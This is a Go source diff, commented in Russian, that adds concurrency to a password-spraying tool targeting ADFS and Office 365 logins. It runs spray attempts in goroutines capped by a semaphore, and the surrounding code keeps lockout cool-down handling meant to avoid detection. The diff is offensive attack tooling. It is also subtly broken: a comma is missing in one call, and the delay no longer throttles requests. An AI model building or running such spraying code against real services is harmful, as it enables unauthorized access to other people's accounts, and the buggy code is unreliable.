@@ -143,17 +143,41 @@ func SprayEmailsADFSO365(
 			}
 			defer file.Close()
 			scanner := bufio.NewScanner(file)
+
+			// Создаем канал с размерами буфера, чтобы ограничить количество одновременно работающих горутин
+			concurrentLimit := threads
+			sem := make(chan struct{}, concurrentLimit)
+
+			// Для ожидания завершения всех горутин
+			var wg sync.WaitGroup
+
+			// Считываем строки из файла
 			for scanner.Scan() {
-				SprayADFSO365(
-					domainName,
-					authURL,
-					scanner.Text(),
-					password,
-					"file",
-					logFile,
-				)
+				// Запускаем горутину для каждой строки
+				wg.Add(1)
+				go func(email string) {
+					defer wg.Done()
+
+					// Пытаемся захватить место в канале (блокирует, если превышен лимит)
+					sem <- struct{}{}
+					defer func() { <-sem }() // Освобождаем место в канале после завершения работы горутины
+
+					SprayADFSO365(
+						domainName,
+						authURL,
+						email
+						password,
+						"file",
+						logFile,
+					)
+
+				}(scanner.Text())
+
+				// Небольшая пауза для имитации задержки, можно настроить в зависимости от необходимости
+				//time.Sleep(10 * time.Millisecond)
 				time.Sleep(time.Duration(delay))
 			}
+
 			if err := scanner.Err(); err != nil {
 				log.Fatal(err)
 			}
@@ -171,6 +195,14 @@ func SprayEmailsADFSO365(
 			}
 			defer passFile.Close()
 			passScanner := bufio.NewScanner(passFile)
+
+			// Канал для ограничения количества горутин
+			concurrentLimit := threads
+			sem := make(chan struct{}, concurrentLimit)
+
+			// WaitGroup для ожидания завершения всех горутин
+			var wg sync.WaitGroup
+
 			for passScanner.Scan() {
 				if lockoutCount == (lockout - 1) {
 					color.Blue("[+] Cooling Down Lockout Time Period For " + strconv.Itoa(lockoutDelay) + " minutes")
@@ -184,16 +216,25 @@ func SprayEmailsADFSO365(
 				}
 				defer emailFile.Close()
 				emailScanner := bufio.NewScanner(emailFile)
+
+				
 				for emailScanner.Scan() {
-					SprayADFSO365(
-						domainName,
-						authURL,
-						emailScanner.Text(),
-						passScanner.Text(),
-						"file",
-						logFile,
-					)
-					time.Sleep(time.Duration(delay))
+					wg.Add(1)
+
+					// Запускаем горутину для обработки каждой строки email
+					go func(email string, password string) {
+						defer wg.Done()
+
+						// Захватываем слот в канале
+						sem <- struct{}{}
+						defer func() { <-sem }() // Освобождаем слот после выполнения горутины
+
+						// Выполняем SprayADFSO365
+						SprayADFSO365(domainName, authURL, email, password, "file", logFile)
+
+						// Пауза для имитации задержки
+						time.Sleep(time.Duration(delay))
+					}(emailScanner.Text(), passScanner.Text())
 				}
 				if err := emailScanner.Err(); err != nil {
 					log.Fatal(err)
